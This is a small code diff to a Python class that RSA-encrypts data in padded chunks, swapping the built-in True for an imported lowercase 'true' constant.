@@ -1,6 +1,7 @@
 from payload.rsa.key import Key
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+from common.commondefs import true
 import base64, zlib
 
 class Encrypt:
@@ -30,7 +31,7 @@ class Encrypt:
         while not end_loop:
             chunk = raw_data[offset:offset + chunk_size] # Current chunk
             if len(chunk) % chunk_size != 0: # Add padding, this means that the loop reached the end of the file
-                end_loop = True
+                end_loop = true
                 chunk += b" " * (chunk_size - len(chunk))
             encrypted += self.rsa_key.encrypt(chunk) # Append the encrypted chunk to the overall encrypted file
             offset += chunk_size # Increase the offset by chunk size
